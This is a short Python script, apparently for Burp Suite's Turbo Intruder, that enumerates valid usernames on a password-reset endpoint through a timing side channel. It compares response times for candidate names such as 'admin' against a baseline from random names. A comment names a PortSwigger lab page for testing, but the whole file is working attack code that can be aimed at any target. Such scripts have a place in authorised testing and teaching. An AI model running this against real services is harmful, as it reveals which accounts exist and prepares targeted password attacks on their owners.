
base_times_count = 8
per_username_count = 6
threshold = 10 # ms
maps = {}

# You can test this code on http://portswigger-labs.net/password_reset.php?username=%s
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100
                           )

    engine.userState['base_times'] = []

    for i in range(base_times_count): # random string username
        engine.queue(target.req, randstr(i), label='benchmark')
        
#    for username in open("username.txt"):
    test_usernames = ['test', 'foo', 'albinowax', 'bar', "admin"] # test usernames
    for username in test_usernames:
        user_label = randstr(6)
        for i in range(per_username_count):
            engine.queue(target.req, username.rstrip(), label=user_label)


def handleResponse(req, interesting):
    if req.label == 'benchmark':
        print('benchmark: ', req.time)
        req.engine.userState['base_times'].append(req.time)
    else:
        if req.label not in maps:
            maps[req.label] = []
        maps[req.label].append(req.time)
        
        if len(maps[req.label]) == per_username_count: 
            base_times = sorted(req.engine.userState['base_times'])
            filtered_times = base_times[1:-1]
            avg = sum(filtered_times) / len(filtered_times)
            
            if min(maps[req.label]) - avg > threshold * 1000:
                print(req.label, maps[req.label], avg)
                table.add(req)
            maps.pop(req.label)

